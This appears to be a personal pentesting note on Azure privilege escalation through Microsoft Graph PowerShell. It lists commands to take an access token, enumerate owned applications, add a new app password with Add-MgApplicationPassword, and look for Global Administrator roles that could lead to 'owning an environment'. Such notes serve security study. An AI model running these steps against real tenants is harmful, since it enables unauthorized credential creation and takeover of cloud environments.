
Once logged in, we're going to jump to the powershell method of connection. First, get your access token:
`az account get-access-token --resource https://graph.microsoft.com`

This token can be useful to log in into the MgGraph using the PS connection method:

Store your token in a variable to use it:
`token=[the entire token]`
`PS> Connect-MgGraph -AccessToken $token`

*remember there are several clients to connect to Azure, in powershell is one, and az is another*

Get some context about your user:
`PS> Get-MgContext`
this will show a correct authentication

Get the User ID:
`PS> Get-MgUser -Filter "startswith(displayName,'[name of user]')"`

Let's check what objects the user can access:
`PS> Get-MgUserOwnedObject -UserId [UserID] | ConvertTo-Json`

Check for any applications that you may have access to, like, you may see it's name next to "displayName". If you see any apps you have access to, check them with:

`PS> Get-MgApplication -Filter "startswith(displayName,'[app name]')"`

Check it's owner:
`PS> Get-MgApplicationOwner -ApplicationId "AppObjectID" | ConvertTo-Json`

You may have rights over the app. If you do or have further permissions, you can try to create some new credentials:

`PS> Add-MgApplicationPassword -ApplicationId "AppObjectID" | ConvertTo-Json`

If you're successful, you will get the new credential's secret.

Sometimes applications have high privileges by misconfigurations, so you may want to check if you're a member or manager of any apps, and also the roles assigned to that application:

`PS> Get-MgDirectoryRolememberasServicePrincipal -DirectoryRoleId [ID of application] | ConvertTo-json`

Check if the role is part of any global administrators, this could lead you to owning an environment.


### Properties
---
📆 created   {{08-01-2025}} 21:15
🏷️ tags: #cloud #azure 

---
